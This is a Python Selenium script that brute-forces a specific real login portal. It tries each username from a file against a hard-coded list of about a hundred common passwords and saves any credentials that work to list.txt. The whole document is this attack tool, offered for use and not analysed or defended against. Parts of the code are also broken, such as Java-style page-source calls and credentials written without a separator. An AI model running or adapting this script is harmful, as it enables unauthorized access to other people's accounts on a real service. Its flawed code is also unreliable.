passwords= ['asd','123456','password','12345678','qwerty','123456789','12345','1234','111111',
			'1234567','dragon','123123','baseball','abc123','football','monkey','letmein','696969',
			'shadow','master','666666','qwertyuiop','123321','mustang','1234567890','michael','654321',
			'pussy','superman','1qaz2wsx','7777777','fuckyou','121212','000000','qazwsx','123qwe','killer',
			'trustno1','jordan','jennifer','zxcvbnm','asdfgh','hunter','buster','soccer','harley','batman',
			'andrew','tigger','sunshine','iloveyou','fuckme','2000','charlie','robert','thomas','hockey',
			'ranger','daniel','starwars','klaster','112233','george','asshole','computer','michelle','jessica',
			'pepper','1111','zxcvbn','5555551','11111111','131313','freedom','777777','pass','fuck','maggie',
			'159753','aaaaaa','ginger','princess','joshua','cheese','amanda','summer','love','ashley','6969',
			'nicole','chelsea','biteme','matthew','access','yankees','987654321','dallas','austin','thunder',
			'taylor','matrix','asdfghjkl','username','user']			#Passwords
			
url = "http://phc.prontonetworks.com/cgi-bin/authlogin"					#LoginURL
url2 = "http://phc.prontonetworks.com/cgi-bin/authlogout"				#LogoutURL
curuser=''
filelength = sum(1 for line in open('usernames.txt'))

def readuser():
	f = open('usernames.txt', '+r')
	cur=f.readline().rstrip()
	x = f.read();
	f2= open('temp.txt','w')
	f2.write(x);
	f.close()	
	f2.close()
	os.remove('usernames.txt')
	os.rename('temp.txt', 'usernames.txt')
	passwords[0]=cur
	return cur

def	loginuserpass(passw):
	username = driver.find_element_by_name("userId")		
	username.clear()
	print("username: "+curuser)
	username.send_keys(curuser)		
	password = driver.find_element_by_name("password")
	password.clear()
	print("password: "+passw+"\n")
	password.send_keys(passw)						
	driver.find_element_by_name("Submit22").click()
    
import time
import os
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains

driver = webdriver.Chrome(executable_path=r'chromedriver.exe')
driver.get(url2)
driver.get(url)
print("No. of usernames to try: "+str(filelength)+"\n")

for i in range(filelength):													#No of lines in usernames.txt
	curuser=readuser()
	for i in range(len(passwords)):
		if driver.find_element_by_name("userId"):
			loginuserpass(passwords[i])
			i+=1
		elif driver.getPageSource().contains("You are already logged in"):
			print("SUCCESS")
			f3= open('list.txt','w')
			f3.write(curuser+passwords[i]+'\n');
			f3.close()
			driver.get(url2)
			driver.get(url)
		else:
			time.sleep(.2)
